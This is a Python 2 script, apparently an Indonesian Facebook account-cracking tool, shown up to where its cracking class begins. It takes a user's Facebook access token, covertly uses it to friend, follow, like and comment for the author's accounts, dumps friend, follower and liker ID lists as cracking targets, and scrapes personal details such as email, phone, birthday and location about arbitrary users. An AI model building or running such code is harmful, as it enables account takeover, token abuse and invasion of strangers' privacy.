#!/usr/bin/python2
# coding=utf-8
# Coded By Bangsat Militan
# My Facebook ( https://www.facebook.com/PEMUDA.KALEUM )

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By Bajingan-Z.

import os
try:
    import requests
except ImportError:
    print '\n [×] Modul requests belum terinstall!...\n'
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [×] Modul Futures belum terinstall!...\n'
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    print '\n [×] Modul Bs4 belum terinstall!...\n'
    os.system('pip2 install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as RakaAmanda
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Raka Andrian Tara.  #
#------------------------------->
amanda_sayang_raka = '244541413774000'
ok, cp, id, loop = [], [], [], 0
waktu = ct.strftime("%H:%M:%S / %d-%m-%Y ")
love = random.choice(['❤️','💛','💚','💙','🖤','🧡','💜'])
kata_kata_cinta = random.choice(["Cinta sejati bukan berarti tidak terpisahkan. Itu hanya berarti dipisahkan, namun tidak ada yang berubah."," Aku tahu aku jatuh cinta padamu karena kenyataanku akhirnya lebih indah dari mimpiku.","Kamu adalah pikiran terakhir dalam pikiranku sebelum tertidur dan pikiran pertama ketika aku bangun setiap pagi.","Bagi dunia, kamu mungkin satu orang, tetapi bagi satu orang kamu adalah dunia.","Kamu telah mengganti mimpi burukku dengan mimpi indah, kekhawatiranku dengan kebahagiaan, dan ketakutanku dengan cinta.","Kamu mungkin memegang tanganku untuk sementara waktu, tetapi kamu memegang hatiku selamanya.","Kekasihku, janganlah engkau menangis, berbahagialah kekasihku, jangan ada duka yang menyelimutimu. Aku berharap kau selalu dalam keadaan bahagia meski dari jauh aku saja tak bisa membahagiakanmu dan membuatmu tertawa.","Ketika seseorang membuat kamu menjadi orang yang paling bahagia dan orang paling menyedihkan pada saat yang sama, itulah saat yang nyata. Itu adalah sesuatu yang berharga.","Tidak peduli berapa banyak perkelahian yang mungkin kamu alami, jika kamu benar-benar mencintai seseorang, itu tidak akan menjadi masalah pada akhirnya.","Dicintai secara mendalam oleh seseorang memberimu kekuatan. Mencintai seseorang secara mendalam memberimu keberanian.","Cinta sejati tidak harus berarti menyatu, terkadang cinta sejati itu terpisah namun tak ada yang berubah.","Saat pagi datang, senyumanmu memeluk pikiranku, saat siang datang kau bagaikan payung yang selalu membuatku teduh, dan saat malam kau adalah kehangatan yang selalu membuatku jauh dari kedinginan.","Mencintai merupakan sebuah anugerah besar yang Tuhan berikan kepada manusia. Maka dari itu, kita perlu senantiasa bersyukur dan menjaga segala anugerah itu.","Mungkin ketidaksempurnaan kita yang membuat kita begitu sempurna satu sama lain.","Aku yakin bahwa cinta kita nanti akan bersatu dalam ikatan suci."])
kata_utama = ("Pengguna Script Premium ")
komen = kata_utama+love+"\n"+kata_kata_cinta+"\n"+waktu
kata_mutiara_islam = random.choice(["Kita tidak akan pernah tahu bagimana menyembahNya sebelum kita mulai dengan bagaimana mencintaiNya.","Apakah engkau meremehkan suatu doa kepada Allah, apakah engkau tahu keajaiban dan kemukjizatan doa? Ibarat panah dimalam hari, ia tidak akan meleset namun ia punya batas dan setiap batas ada saatnya untuk selesai.","Jangan berjalan dimuka bumi dengan penuh kesombongan dan congkak karena sebentar lagi engkau akan masuk ke dalam bumi juga.","Barang siapa yang bersungguh-sungguh berjalan pada jalannya maka pasti ia akan sampai pada tujuannya.","Ilmu pengetahuan di waktu kecil itu bagaikan ukiran di atas batu.","Bukanlah anak yatim itu yang telah meninggal orangtuanya, tetapi sesungguhnya yatim itu adalah yatim ilmu dan akhlak.","Ilmu tanpa agama adalah suatu kecacatan, dan agama tanpa ilmu merupakan kebutaan","Kegagalan adalah cara Allah untuk mengatakan bersabarlah karena aku memiliki sesuatu yang lebih baik untukmu saat waktunya tiba.","Kita tidak akan pernah kalah sampai kita menyerahkan semuanya kepada Tuhan.","Bagimu agamamu, bagiku agamaku. Karena sesungguhnya tidaka ada paksaan dalam beragama.","Sabar dan bisa mengikhlaskan sesuatu yang telah pergi adalah salah satu cara untuk mendapatkan kebahagian."])
kata_utama2 = random.choice(["Hai Aa Raka 😊","Hello Aa Raka 😊","Hello Aa Raka 😊","Hai Aa Raka 😊"])
komen2 = kata_utama2+"\n"+kata_mutiara_islam+"\n"+waktu
pantun_motivasi = random.choice(["Jalan-jalan naik kereta, Naik ke atas pakai tangga. Mari kita gapai cita-cita, Bahagia dunia, masuk ke surga.","Pisau tajam dari baja, Perang panjang banyak guna. Membayar sukses dengan kerja, Bayar sekarang, kelak bahagia.","Sampan sudah, rakit sudah, Yang belum hanya bahteranya. Sarapan sudah, ngopi sudah, Yang belum tinggal kerjanya.","Kapas terhembus angin ringan, Sejuk terasa angin pantai. Lebih bahagia dalam perjuangan, Daripada dalam santai-santai."])
kata_utama3 = ("MOGA LANGGENG AA @[100000834003593:] SAMA TTH @[100003016223315:] NYA AMIN😊")
komen3 = kata_utama3+"\n"+pantun_motivasi+"\n"+waktu
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

# MAJU MUNDUR
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(1)

def raka_z():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] Menghapus Token %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)

# LO GOBLOG
logo = ''' 
\033[0;91mooooooooo.             oooo                                     
\033[0;92m`888   `Y88.           `888                                     
\033[0;93m 888   .d88'  .oooo.    888  oooo   .oooo.         oooooooo 
\033[0;94m 888ooo88P'  `P  )88b   888 .8P'   `P  )88b       d'""7d8P  
\033[0;95m 888`88b.     .oP"888   888888.     .oP"888 888888 .d8P'   
\033[0;96m 888  `88b.  d8(  888   888 `88b.  d8(  888       .d8P'  .P 
\033[0;97mo888o  o888o `Y888""8o o888o o888o `Y888""8o     d8888888P  
'''

raka_sayang_amanda = '3882176535153442'
# crack selesai
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\n %s[%s#%s] Crack Selesai...'%(N,K,N)
        print '\n\n [%s+%s] Total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
        print ' [%s+%s] Total CP : %s%s%s'%(O,N,K,str(len(cp)),N);exit()
    else:
        print '\n\n [%s!%s] Opshh Kamu Tidak Mendapatkan Hasil :('%(M,N);exit()

#masuk token
def raka_z():
    os.system('clear')
    print (' %s◍➤%s This Tool Uses Facebook Token Login.\n %s◍➤%s Do You Already Know How To Get Facebook Token?\n %s◍➤%s Type %sOpen%s To Get Facebook Token.'%(O,N,O,N,O,N,H,N))
    amanda = raw_input('\n %s[%s?%s] Login ☆TOKEN☆ :%s '%(N,M,N,H))
    if amanda in ('open', 'Open', 'OPEN'):
        print '\n%s *%s Download Apk Kiwi Browser Terlebih Dahulu'%(B,N);time.sleep(1)
        print '%s *%s Klick Dikolom pencarian %https://chrome.google.com/webstore/detail/get-cookie/naciaagbkifhpnoodlkhbejjldaiffcm'%(B,N,H);time.sleep(1)
        print '%s *%s Setelah Itu Klick %sTambahkan Ke Chrome Selesai'%(B,N,H);time.sleep(1)
        print '%s *%s Login Akun Fb Dikiwi Lalu Klick %sTitik Tiga Dipojok Kanan Atas%s Tinggal Diklick Paling Bawah Get Cookie %sSelesai%s Pahamkan'%(B,N,H,N,H,N);time.sleep(1)
        raw_input(' %s◍➤%s Tekan Enter '%(O,N))
        os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
        raka_z()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(amanda)).json()['name']
        print '\n %s<>%s WELCOME %s%s%s'%(O,N,K,nama,N);time.sleep(2)
        print ' %s<>%s Please Use This Sc Properly,\n We Are Not Responsible If This Sc Is Misused...'%(O,N);time.sleep(1)
        open('.memek.txt', 'w').write(amanda)
        raw_input(' %s◍➤%s Tekan Enter '%(O,N));wuhan(amanda)
        os.system('xdg-open https://youtu.be/bszAm4C5ovE')
        raka_amanda()
    except KeyError:
        print '\n\n %s[%s!%s] Token Invalid'%(N,M,N);time.sleep(1);raka_z()

### ORANG GANTENG ###
def raka_amanda():
    os.system('clear')
    try:
    	amanda = open('.memek.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s] Token Invalid'%(N,M,N);time.sleep(1);os.system('rm -rf .memek.txt');raka_z()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(amanda)).json()['name']
    except KeyError:
        print '\n %s[%s×%s] Token Invalid'%(N,M,N);time.sleep(1);os.system('rm -rf .memek.txt');raka_z()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] Tidak Ada Koneksi\n'%(N,M,N))
    os.system('clear')
    ip = requests.get('https://api.ipify.org').text
    print logo
    jalan('___________________________________________________________\n');time.sleep(00.01)
    jalan(' [\033[0;96m◍➤\033[0m] NAMA       : %s'%(nama);time.sleep(00.01)
    jalan(' [\033[0;96m◍➤\033[0m] IP ADDRES  : %s'%(ip);time.sleep(00.01)
    jalan(' [\033[0;96m◍➤\033[0m] PENGGUNA   : Premium ');time.sleep(00.01)
    jalan('___________________________________________________________\n');time.sleep(00.01)
    jalan(' [%s1%s]\x1b[1;96m◍➤\x1b[1;97m Dump Id Dari Teman'%(O,N);time.sleep(00.01)
    jalan(' [%s2%s]\x1b[1;96m◍➤\x1b[1;97m Dump Id Dari Teman Publik'%(O,N);time.sleep(00.01)
    jalan(' [%s3%s]\x1b[1;96m◍➤\x1b[1;97m Dump Id Dari Total Followers'%(O,N);time.sleep(00.01)
    jalan(' [%s4%s]\x1b[1;96m◍➤\x1b[1;97m Dump Id Dari Like Postingan'%(O,N);time.sleep(00.01)
    jalan(' [%s5%s]\x1b[1;96m◍➤\x1b[1;97m \x1b[1;92mMulai Crack\x1b[1;97m'%(O,N);time.sleep(00.01)
    jalan(' [%s6%s]\x1b[1;96m◍➤\x1b[1;97m Check Informasi Akun Fb'%(O,N);time.sleep(00.01)
    jalan(' [%s7%s]\x1b[1;96m◍➤\x1b[1;97m Lihat Hasil Crack'%(O,N);time.sleep(00.01)
    jalan(' [%s8%s]\x1b[1;96m◍➤\x1b[1;97m Settings User Agent'%(O,N);time.sleep(1)
    jalan(' [%s9%s]\x1b[1;96m◍➤\x1b[1;97m Info %sScript%s'%(O,N,O,N);time.sleep(00.01)
    jalan(' [%s0%s]\x1b[1;96m◍➤\x1b[1;97m Logout (%sHapus Token%s)'%(M,N,M,N);time.sleep(00.01)
    pepek = raw_input('\n [\x1b[1;96m◍➤\x1b[1;97m] Menu : ')
    if pepek == '':
        print '\n %s[%s×%s] jangan kosong kentod!'%(N,M,N);time.sleep(1);raka_amanda()
    elif pepek in['1','01']:
        teman(amanda)
    elif pepek in['2','02']:
        publik(amanda)
    elif pepek in['3','03']:
        followers(amanda)
    elif pepek in['4','04']:
        postingan(amanda)
    elif pepek in['5','05']:
        __crack__().plerr()
    elif pepek in['6','06']:
        cek_ingfo(amanda)
    elif pepek in['7','07']:
        try:
            dirs = os.listdir("results")
            print '\n [ Hasil Crack Yang Tersimpan Di File Anda ]\n'
            for file in dirs:
                print(" [%s+%s] %s"%(O,N,file))
            file = raw_input("\n [%s?%s] Masukan Nama File :%s "%(M,N,H))
            if file == "":
                file = raw_input("\n %s[%s?%s] Masukan Nama File :%s %s"%(N,M,N,H,N))
            total = open("results/%s"%(file)).read().splitlines()
            print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
            nm_file = ("%s"%(file)).replace("-", " ")
            hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "")
            jalan(" [%s*%s] Hasil %sCrack%s Pada Tanggal %s:%s%s%s total %s: %s%s%s"%(M,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
            print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
            for memek in total:
            	kontol = memek.replace("\n","")
                titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
                print("%s%s"%(titid,N));time.sleep(0.03)
            print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));raka_amanda()
        except (IOError):
            print("\n %s[%s×%s] Opshh Kamu Tidak Mendapatkan Hasil :("%(N,M,N))
            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));raka_amanda()
    elif pepek in['8','08']:
        seting_yntkts()
    elif pepek in['9','09']:
        info_tools()
    elif pepek in['0','00']:
        print '\n'
        raka_z()
        time.sleep(1);os.system('rm -rf .memek.txt')
        jalan('\n %s[%s✓%s]%s Berhasil Menghapus Token'%(N,H,N,H));exit()
    else:
        print '\n %s[%s×%s] Menu [%s%s%s] Tidak Ada, Cek Menu Nya Bro!'%(N,M,N,M,pepek,N);time.sleep(2);raka_amanda()

# croottt
def wuhan(amanda):
    try:
        raka = amanda
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=100000834003593&access_token='+amanda)
	requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token='+amanda)
        requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token='+amanda)
	requests.post('https://graph.facebook.com/100006184624502/subscribers?access_token='+amanda)
	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen+'&access_token='+amanda)
	requests.post('https://graph.facebook.com/4257706904267068/likes?summary=true&access_token='+amanda)
	requests.post('https://graph.facebook.com/4134622646575495/likes?summary=true&access_token='+amanda)
	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+amanda)
	requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token='+amanda)
	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,amanda,amanda))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(amanda_sayang_raka,amanda,amanda))
    except:
    	pass

# dump id dari teman hehe
def teman(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        mmk = raw_input('\n %s[%s?%s] Nama File  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] Limit Id   : '%(N,O,N))
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        xxx = open(cin, 'w')
        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,kontol)).json()["data"]:
            id.append(a['name'] + '<=>' + a['id'])
            xxx.write(a['name'] + '<=>' + a['id'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        xxx.close()
        jalan('\n\n %s[%s✓%s] Berhasil Dump Id Dari Teman'%(N,H,N))
        print ' [%s•%s] Salin Output File 👉💦 ( %s%s%s )'%(O,N,M,cin,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));raka_amanda()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] Gagal Dump Id, Kemungkinan Id Tidaklah Publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));raka_amanda()
'''
																																																				csy = 'Cindy sayang Yayan'
																																																				ysc = 'Yayan sayang Cindy'
																																																			'''
# dump id dari teman publik hehe
def publik(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] Id Publik  : '%(N,O,N))
        ahh = raw_input(' %s[%s?%s] Nama File  : '%(N,O,N))
        ihh = raw_input(' %s[%s?%s] Limit Id   : '%(N,O,N))
        knt = ('dump/' + ahh + '.json').replace(' ', '_')
        xxx = open(knt, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,kontol)).json()["data"]:
            id.append(a['name'] + '<=>' + a['id'])
            xxx.write(a['name'] + '<=>' + a['id'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        xxx.close()
        jalan('\n\n %s[%s✓%s] Berhasil Dump Id Dari Teman Publik'%(N,H,N))
        print ' [%s•%s] Salin Output File 👉💦 ( %s%s%s )'%(O,N,M,knt,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));raka_amanda()
    except (KeyError,IOError):
        os.remove(knt)
        jalan('\n %s[%s!%s] Gagal Dump Id, Kemungkinan Id Tidaklah Publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));raka_amanda()

# dump id dari followers hehe
def followers(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] Id Follow  : '%(N,O,N))
        mmk = raw_input(' %s[%s?%s] Nama File  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] Limit Id   : '%(N,O,N))
        ah  = ('dump/' + mmk + '.json').replace(' ', '_')
        xxx = open(ah, 'w')
        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            xxx.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        xxx.close()
        jalan('\n\n %s[%s✓%s] Berhasil Dump Id Dari Total Followers'%(N,H,N))
        print ' [%s•%s] Salin Output File 👉💦 ( %s%s%s )'%(O,N,M,ah,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));raka_amanda()
    except (KeyError,IOError):
        os.remove(ah)
        jalan('\n %s[%s!%s] Gagal Dump Id, Kemungkinan Id Tidaklah Publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));raka_amanda()

# dump id dari postingan hehe
def postingan(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] Id Posting : '%(N,O,N))
        ppk = raw_input(' %s[%s?%s] Nama File  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] Limit Id   : '%(N,O,N))
        ahh = ('dump/' + ppk + '.json').replace(' ', '_')
        xxx = open(ahh, 'w')
        for a in requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            xxx.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        xxx.close()
        jalan('\n\n %s[%s✓%s] Berhasil Dump Id Dari Like Postingan'%(N,H,N))
        print ' [%s•%s] Salin Output File 👉💦 ( %s%s%s )'%(O,N,M,ahh,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));raka_amanda()
    except (KeyError,IOError):
        os.remove(ahh)
        jalan('\n %s[%s!%s] Gagal Dump Id, Kemungkinan Id Tidaklah Publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));raka_amanda()
#cek ingfo
def cek_ingfo(kontol):
    try:
        user = raw_input("\n [%s+%s] Masukan Id Atau Username : "%(O,N))
        if user == '':
            print "\n [%s!%s] Jangan Kosong Bos"%(M,N);cek_ingfo(kontol)
        url = ("https://lookup-id.com/")
        if "facebook" in user:
            payload = {"fburl": user, "check": "Lookup"}
        else:
            payload = {"fburl": "https://free.facebook.com/" + user, "check": "Lookup"}
        halaman = requests.post(url, data = payload).text.encode("utf-8")
        sop_ = BeautifulSoup(halaman, "html.parser")
        email_ = sop_.find("span", id = "code")
        idt = email_.text
        if user == "me":
            idt = "me"
        x = requests.get('https://graph.facebook.com/%s?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name,gender,link,email,location,hometown,religion,relationship_status,significant_other,about,locale&access_token=%s'%(idt, kontol)).json()
        nmaa = x['name']
    except (KeyError, IOError):
        nmaa = '%s-%s'%(M,N)
    print '\n  * Ingformasi Akun Facebook *';time.sleep(0.03)
    print '\n [*] Nama Lengkap : %s'%(nmaa);time.sleep(0.03)
    try:
    	ndpn = x['first_name']
    except (KeyError, IOError):
    	ndpn = '%s-%s'%(M,N)
    print ' [*] Nama Depan   : %s'%(ndpn);time.sleep(0.03)
    try:
    	nmbl = x['last_name']
    except (KeyError, IOError):
    	nmbl = '%s-%s'%(M,N)
    print ' [*] Nama Belakang: %s'%(nmbl);time.sleep(0.03)
    try:
    	hwhs = x['username']
    except (KeyError, IOError):
    	hwhs = '%s-%s'%(M,N)
    print ' [*] Username Fb  : %s'%(hwhs);time.sleep(0.03)
    try:
    	asu = x['id']
    except (KeyError, IOError):
    	asu = '%s-%s'%(M,N)
    print ' [*] id facebook  : %s'%(asu);time.sleep(0.03)
    print '\n  * data-data akun facebook *\n';time.sleep(0.03)
    try:
    	emai = x['email']
    except (KeyError, IOError):
    	emai = '%s-%s'%(M,N)
    print ' [*] gmail facebook : %s'%(emai);time.sleep(0.03)
    try:
    	nmrr = x['mobile_phone']
    except (KeyError, IOError):
    	nmrr = '%s-%s'%(M,N)
    print ' [*] nomor telepon  : %s'%(nmrr);time.sleep(0.03)
    try:
    	ttll = x['birthday']
        month, day, year = ttll.split("/")
        month = bulan_ttl[month]
    except (KeyError, IOError):
    	month = '%s-%s'%(M,N)
        day = '%s-%s'%(M,N)
        year = '%s-%s'%(M,N)
    print ' [*] tanggal lahir  : %s %s %s '%(day,month,year);time.sleep(0.03)
    try:
    	jenis = x['gender'].replace("female", "Perempuan").replace("male", "Laki-laki")
    except (KeyError, IOError):
    	jenis = ''
    print ' [*] jenis kelamin  : %s '%(jenis)
    try:
    	r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s'%(idt, kontol))
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    except:pass
    print ' [*] Jumlah Teman  : %s'%str(len(id));time.sleep(0.03)
    try:
    	r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt, kontol))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
    	pengikut = '%s-%s'%(M,N)
    print ' [*] total followers: %s'%(pengikut);time.sleep(0.03)
    try:
    	lins = x['link']
    except (KeyError, IOError):
    	lins = '%s-%s'%(M,N)
    print ' [*] link facebook  : %s'%(lins);time.sleep(0.03)
    try:
    	stas = x['relationship_status']
    except (KeyError, IOError):
    	stas = '%s-%s'%(M,N)
    try:
    	dgn = '''dengan %s'''%(x['significant_other']['name'])
    except (KeyError, IOError):
    	dgn = '%s-%s'%(M,N)
    except: pass
    print ' [*] status hubungan: %s %s'%(stas,dgn);time.sleep(0.03)
    try:
    	bioo = x['about']
    except (KeyError, IOError):
    	bioo = '%s-%s'%(M,N)
    except: pass
    print ' [*] tentang status : %s'%(bioo);time.sleep(0.03)
    try:
    	dari = x['hometown']['name']
    except (KeyError, IOError):
    	dari = '%s-%s'%(M,N)
    except: pass
    print ' [*] kota asal      : %s'%(dari);time.sleep(0.03)
    try:
    	tigl = x['location']['name']
    except (KeyError, IOError):
    	tigl = '%s-%s'%(M,N)
    except: pass
    print ' [*] tinggal di     : %s'%(tigl);time.sleep(0.03)
    try:
    	tzim = x['timezone']
    except (KeyError, IOError):
    	tzim = '%s-%s'%(M,N)
    except: pass
    print ' [*] zona waktu     : %s'%(tzim);time.sleep(0.03)
    try:
    	jam  = x['updated_time'][11:19]
    	uptd = x['updated_time'][:10]
        year, month, day = uptd.split("-")
        month = bulan_ttl[month]
    except (KeyError, IOError):
    	year = '%s-%s'%(M,N)
        month = '%s-%s'%(M,N)
        day = '%s-%s'%(M,N)
    except:pass
    print ' [*] Terakhir Di Updated Pada Tanggal %s Bulan %s Tahun %s Jam %s'%(day, month, year, jam);time.sleep(0.03)
    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m'
    jalan('\n [%s✓%s] Berhasil Mengecek Data² Akun Facebook\n\n'%(O,N));exit()

# cek ingfo sc
def info_tools():
    os.system('clear')
    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
    print '\n %s[%s>%s]◍➤ Yt       : Angga-Z.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s]◍➤ Author   : Bangsat Militan☆.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s]◍➤ Github   : https://github.com/Bajingan-Z-XD'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s]◍➤ Facebook : https://www.facebook.com/PEMUDA.KALEM'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s]◍➤ Instagram: https://www.instagram.com/bangsat_xd'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
    raw_input('\n  [ %sKEMBALI%s ] '%(O,N));raka_amanda()

### ganti user agent
def seting_yntkts():
    print '\n (%s1%s) ganti user agent'%(O,N)
    print ' (%s2%s) check user agent'%(O,N)
    ytbjts = raw_input('\n %s[%s?%s] choose : '%(N,O,N))
    if ytbjts == '':
        print '\n %s[%s×%s] Gak Boleh Kosong Kentod'%(N,M,N);time.sleep(2);seting_yntkts()
    elif ytbjts in['1','01']:
        urang_ge_lieur()
    elif ytbjts in['2','02']:
        try:
            user_agent = open('YNTKTS.txt', 'r').read()
        except IOError:
            user_agent = '%s-'%(M)
        print '\n %s[%s+%s] User Agent anda : %s%s'%(N,O,N,H,user_agent)
        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));raka_amanda()
    else:
        print '\n %s[%s×%s] Input Yang Bener'%(N,M,N);time.sleep(2);seting_yntkts()
# User Agent baru
def urang_ge_lieur():
    os.system('rm -rf YNTKTS.txt')
    _asu_ = raw_input('\n [%s?%s] Ingin Menggunakan User Agent Hp Anda [Y/t]: '%(O,N))
    if _asu_ == '':
        print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N);urang_ge_lieur()
    elif _asu_ in['Y','y']:
        jalan('\n %s *%s Anda Akan Di Arakan Ke Situs Web Setelah Diarahkan Ke Situs Web.\n  %s*%s klik ikon %sMY USER AGENT%s lalu copy semua user agent anda...'%(O,N,O,N,H,N));time.sleep(2);os.system('xdg-open http://ipinfo.io/json')
        _agen_ = raw_input(' [%s?%s] Masukan User Agent Hp Anda :%s '%(O,N,H))
        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s[%s✓%s] Berhasil Menggunakan User Agent Hp Anda...'%(N,H,N))
        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));raka_amanda()
    elif _asu_ in['T','t']:
        _agen_ = raw_input(' [%s?%s] masukan user agent :%s '%(O,N,H))
        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s[%s✓%s] Berhasil Mengganti User Agent...'%(N,H,N))
        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));raka_amanda()
    else:
        print '\n %s[%s!%s] Y/t ngentod'%(N,M,N);urang_ge_lieur()
# mulai ngecrot awokawokawokkawok
class __crack__:

